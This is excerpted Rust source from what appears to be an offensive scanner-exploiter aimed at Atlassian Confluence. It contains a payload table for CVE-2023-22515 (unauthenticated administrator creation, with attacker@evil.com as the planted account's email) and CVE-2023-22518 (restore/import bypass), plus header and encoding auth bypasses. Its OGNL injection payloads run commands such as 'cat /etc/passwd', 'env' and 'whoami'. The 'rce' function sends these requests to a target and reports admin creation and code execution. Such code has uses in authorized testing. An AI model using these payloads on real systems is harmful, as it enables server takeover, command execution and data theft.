...
const CVE_PAYLOADS: &[(&str, &str, &str)] = &[
    (
        "CVE-2023-22515 — create admin",
        "POST",
        "/setup/setupadministrator.action?token=bypass&username=attacker&password=Attacker123!&email=attacker@evil.com&fullName=Attacker",
    ),
    (
        "CVE-2023-22515 — setup bypass",
        "GET",
        "/setup/setupstart.action?setup-select=true",
    ),
    (
        "CVE-2023-22515 — chooser bypass",
        "GET",
        "/setup/choosesetup.action?setup-select=true",
    ),
    ("CVE-2023-22515 — bootstrap", "GET", "/bootstrap.action"),
    (
        "CVE-2023-22518 — import zip",
        "POST",
        "/json/setupdataimport.action?token=bypass",
    ),
    (
        "CVE-2023-22518 — upload zip",
        "POST",
        "/admin/restoreaction!upload.action?token=bypass",
    ),
    (
        "CVE-2023-22518 — restore",
        "POST",
        "/admin/restoreaction!restore.action?token=bypass",
    ),
    (
        "CVE-2023-22518 — import zip alt",
        "POST",
        "/json/setupdataimport.action",
    ),
    (
        "CVE-2023-22515 — token bypass",
        "GET",
        "/setup/setupadministrator.action?token=",
    ),
    (
        "CVE-2023-22515 — admin list",
        "GET",
        "/setup/setupadministrator.action",
    ),
    (
        "Auth bypass — X-Forwarded-For",
        "GET",
        "/admin/console.action",
    ),
    ("Auth bypass — X-Original-URL", "GET", "/admin/users.action"),
    (
        "Auth bypass — path param",
        "GET",
        "/admin/users.action;jsessionid=fake",
    ),
    (
        "Auth bypass — double encoding",
        "GET",
        "/%61dmin/console.action",
    ),
    ...
    (
        "RCE — OGNL via param",
        "GET",
        "/pages/doenterpage.action?spaceKey=@java.lang.Runtime@getRuntime().exec('id')",
    ),
    (
        "RCE — OGNL via title",
        "GET",
        "/pages/createpage.action?spaceKey=TEST&title=${@java.lang.Runtime@getRuntime().exec('env')}",
    ),
    (
        "RCE — OGNL via label",
        "GET",
        "/pages/dolabel.action?label=${@java.lang.Runtime@getRuntime().exec('cat+/etc/passwd')}",
    ),
    (
        "RCE — OGNL via attachment",
        "POST",
        "/pages/doattachfile.action?filename=${@java.lang.Runtime@getRuntime().exec('whoami')}",
    ),
];
...
pub async fn rce(url: &str, token: Option<&str>, timeout: u64) -> anyhow::Result<()> {
    ...
    println!(
        "{} CVE-2023-22515 (admin creation) + CVE-2023-22518 (import RCE)",
        "[*]".cyan().bold()
    );
    ...
    println!(
        "\n{} [1/2] Confluence endpoint discovery...",
        "[*]".cyan().bold()
    );
    ...
    for (name, path) in CONFLUENCE_ENDPOINTS {
        ...
        match client.get(&full_url).send().await {
            Ok(resp) => {
                ...
                let has_setup =
                    body.contains("setup") || body.contains("Setup") || body.contains("bootstrap");
                ...
                let tag = if accessible {
                    if has_setup {
                        "SETUP EXPOSED".red().bold().to_string()
                    } else if has_admin {
    ...
    println!(
        "\n{} [2/2] CVE-2023-22515 + CVE-2023-22518 exploits...",
        "[*]".cyan().bold()
    );
    ...
    for (name, method, path) in CVE_PAYLOADS {
        ...
        match req.send().await {
            Ok(resp) => {
                ...
                let has_success = body.contains("success")
                ...
                let has_error =
                    body.contains("error") || body.contains("invalid") || body.contains("denied");
                ...
                if has_rce
                    || (has_success && (is_22515 || is_22518))
                    || (has_admin_form && is_22515)
                {
                    if is_22515 {
                        admin_created = true;
                    }
    ...
    if setup_exposed {
        println!(
            "{} [CRITICAL] Setup/bootstrap endpoints exposed — unauthenticated access to admin creation!",
            "[!]".red().bold()
        );
    }
    if admin_created {
        println!(
            "{} [CRITICAL] CVE-2023-22515 — admin account creation successful!",
            "[!]".red().bold()
        );
    }
    if import_rce {
        println!(
            "{} [CRITICAL] CVE-2023-22518 — malicious zip import RCE!",
            "[!]".red().bold()
        );
    }
    if ognl_rce {
        println!(
            "{} [CRITICAL] OGNL injection — remote code execution!",
            "[!]".red().bold()
        );
    }
    if results.is_empty() && !setup_exposed {
        println!(
            "{} No Confluence vulnerabilities detected.",
            "[-]".green().bold()
        );
    }
